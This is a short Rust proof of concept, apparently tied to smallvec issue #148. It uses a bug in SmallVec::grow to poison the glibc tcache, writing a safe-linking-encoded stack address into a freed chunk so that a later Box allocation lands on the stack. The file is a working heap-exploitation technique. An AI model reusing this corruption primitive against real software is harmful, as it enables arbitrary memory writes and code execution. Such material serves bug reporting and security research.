// https://github.com/servo/rust-smallvec/issues/148
use smallvec::SmallVec;

#[derive(Debug)]
struct MyStruct([u8; 0x20]);

fn push(v: &mut SmallVec<[u8; 0x10]>, val: u8) {
    v.push(val);
}

fn grow(v: &mut SmallVec<[u8; 0x10]>, size: usize) {
    v.grow(size);
}

// Pushes size = 0x30 chunk onto tcache
fn vuln(mut v: SmallVec<[u8; 0x10]>) {
    for _ in 0..0x10 {
        push(&mut v, 0x69);
    }
    push(&mut v, 0xFF);
    grow(&mut v, 0x20);

    v[9] = 0x41;
}

fn main() {
    let stack_var = [0x20u64; 3];
    let stack_ptr = (&stack_var) as *const u64 as u64;
    let stack_ptr = stack_ptr + 0x8; // Align?

    let v = SmallVec::<[u8; 0x10]>::new();
    vuln(v);

    let s1 = Box::new(MyStruct([0xAA; 0x20]));

    let inner = Box::into_raw(s1) as *mut u8 as *mut u64;
    let new_addr = inner as u64;
    let craft_val = (new_addr >> 12) ^ stack_ptr;
    unsafe { *inner = craft_val; }

    let _s2 = Box::new(MyStruct([0xBB; 0x20]));
    let _p2 = Box::into_raw(_s2);

    let s3 = Box::new(MyStruct([0xCC; 0x20]));
    let p3 = Box::into_raw(s3);
    println!("s3 = {p3:?}"); // Stack pointer
}
